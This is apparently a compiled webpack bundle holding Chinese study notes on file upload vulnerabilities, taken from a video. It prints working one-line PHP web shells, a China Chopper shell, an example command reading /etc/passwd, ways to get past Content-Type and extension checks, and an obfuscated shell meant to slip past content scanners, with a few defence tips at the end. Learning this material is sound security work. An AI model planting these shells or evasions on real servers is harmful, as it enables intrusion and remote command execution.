(window.webpackJsonp=window.webpackJsonp||[]).push([[207],{1264:function(t,n){const e={render:function(){var t=this;t.$createElement;return t._self._c,t._m(0)},staticRenderFns:[function(){var t=this,n=t.$createElement,e=t._self._c||n;return e("div",{staticClass:"frontmatter-markdown"},[e("h2",{attrs:{id:"前言"}},[t._v("前言")]),t._v(" "),e("p",[t._v("本文是观看"),e("a",{attrs:{href:"https://www.bilibili.com/video/BV1g4411Y7Y4/"}},[t._v("此视频")]),t._v("时的笔记")]),t._v(" "),e("h2",{attrs:{id:"原理"}},[t._v("原理")]),t._v(" "),e("p",[t._v("如果有一些表单需要上传文件到服务器，并且服务器没做文件校验，就可以利用此能力向服务器植入木马")]),t._v(" "),e("blockquote",[e("p",[t._v("比如：假设服务器基于 PHP，如果我们成功上传了一个 PHP 文件到服务器，并拿到了它的路径，我们就可以访问这个路径，从而触发 PHP 脚本的执行")])]),t._v(" "),e("h2",{attrs:{id:"webshell"}},[t._v("WebShell")]),t._v(" "),e("ul",[e("li",[t._v("概念\n"),e("ul",[e("li",[t._v("小马：一句话木马，整个 shell 代码量只有一行，一般是系统执行函数")]),t._v(" "),e("li",[t._v("大马：代码量多，通常会进行二次编码加密")])])]),t._v(" "),e("li",[t._v("权限\n"),e("ul",[e("li",[t._v("拿到 WebShell 之后，相当于从 PHP 执行各种命令，所以执行命令的用户为 Web 服务器的用户（比如"),e("code",{pre:!0},[t._v("Apache")]),t._v("）")])])])]),t._v(" "),e("pre",{staticClass:"language-php"},[e("code",{pre:!0,attrs:{class:"language-php"}},[t._v("# 使用PHP中的 `eval` 函数，可以执行PHP代码\n"),e("span",{pre:!0,attrs:{class:"token php language-php"}},[e("span",{pre:!0,attrs:{class:"token delimiter important"}},[t._v("<?php")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("eval")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),e("span",{pre:!0,attrs:{class:"token global"}},[t._v("$_REQUEST")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),e("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[t._v("'cmd'")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),e("span",{pre:!0,attrs:{class:"token delimiter important"}},[t._v("?>")])]),t._v("\n# 示例：curl xxx.php?cmd=phpinfo();\n\n# 使用PHP中的 `system` 函数，可以使用Linux系统命令\n"),e("span",{pre:!0,attrs:{class:"token php language-php"}},[e("span",{pre:!0,attrs:{class:"token delimiter important"}},[t._v("<?php")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token function"}},[t._v("system")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),e("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$REQUEST")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),e("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[t._v("'cmd'")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),e("span",{pre:!0,attrs:{class:"token delimiter important"}},[t._v("?>")])]),t._v("\n# 示例：curl xxx.php?cmd=cat /etc/passwd\n\n# 使用中国菜刀之类的C/S架构的工具进行连接\n"),e("span",{pre:!0,attrs:{class:"token php language-php"}},[e("span",{pre:!0,attrs:{class:"token delimiter important"}},[t._v("<?php")]),t._v(" @"),e("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("eval")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),e("span",{pre:!0,attrs:{class:"token global"}},[t._v("$_POST")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),e("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[t._v("'chopper'")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),e("span",{pre:!0,attrs:{class:"token delimiter important"}},[t._v("?>")])]),t._v("\n")])]),t._v(" "),e("h2",{attrs:{id:"绕过简单检测"}},[t._v("绕过简单检测")]),t._v(" "),e("h3",{attrs:{id:"content-type"}},[t._v("Content-Type")]),t._v(" "),e("p",[t._v("如果服务器检测了上传的文件的"),e("code",{pre:!0},[t._v("Content-Type")]),t._v(" Header，可以使用 BurpSuite 进行绕过")]),t._v(" "),e("p",[t._v("BurpSuite 可以启动一个正向代理，可以修改请求内容")]),t._v(" "),e("h3",{attrs:{id:"后缀名检测"}},[t._v("后缀名检测")]),t._v(" "),e("p",[t._v("如果服务器使用了后缀名检测，可以使用图片编辑工具，比如"),e("code",{pre:!0},[t._v("edjpgcom")]),t._v("，可以在正常的图片中嵌入代码。或者用"),e("code",{pre:!0},[t._v("copy")]),t._v("之类的命令编辑图片文件")]),t._v(" "),e("p",[t._v("嵌入代码后的图片仍然是图片，所以不会被服务器执行。但是使用【本地文件包含/LFI】就可以使服务器执行此文件，实现挂马")]),t._v(" "),e("blockquote",[e("p",[t._v("文件不要太大")])]),t._v(" "),e("h3",{attrs:{id:"文件内容检测"}},[t._v("文件内容检测")]),t._v(" "),e("p",[t._v("有些操作系统（比如 Windows）会自动扫描文件内容，识别木马特征。")]),t._v(" "),e("p",[t._v("通过拆分关键字、编码、加密等方式，可能可以绕过这些检测。")]),t._v(" "),e("p",[t._v("比如把上文的一句话木马改成：")]),t._v(" "),e("pre",{staticClass:"language-php"},[e("code",{pre:!0,attrs:{class:"language-php"}},[e("span",{pre:!0,attrs:{class:"token php language-php"}},[e("span",{pre:!0,attrs:{class:"token delimiter important"}},[t._v("<?php")]),t._v("\n"),e("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$a")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token function"}},[t._v("substr_replace")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),e("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[t._v("'evxx'")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),e("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[t._v("'al'")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),e("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n"),e("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$b")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),e("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[t._v("''")]),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=>")]),e("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$a")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),e("span",{pre:!0,attrs:{class:"token global"}},[t._v("$_POST")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),e("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[t._v("'chopper'")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n"),e("span",{pre:!0,attrs:{class:"token delimiter important"}},[t._v("?>")])]),t._v("\n")])]),t._v(" "),e("h2",{attrs:{id:"防护"}},[t._v("防护")]),t._v(" "),e("ul",[e("li",[t._v("使用专业 WAF 过滤请求")]),t._v(" "),e("li",[t._v("增强服务器中的请求校验")]),t._v(" "),e("li",[e("code",{pre:!0},[t._v("grep")]),t._v("查文件内容")])])])}]};t.exports={attributes:{title:"Security-2",description:"文件上传漏洞"},vue:{render:e.render,staticRenderFns:e.staticRenderFns,component:{data:function(){return{templateRender:null}},render:function(t){return this.templateRender?this.templateRender():t("div","Rendering")},created:function(){this.templateRender=e.render,this.$options.staticRenderFns=e.staticRenderFns}}}}}}]);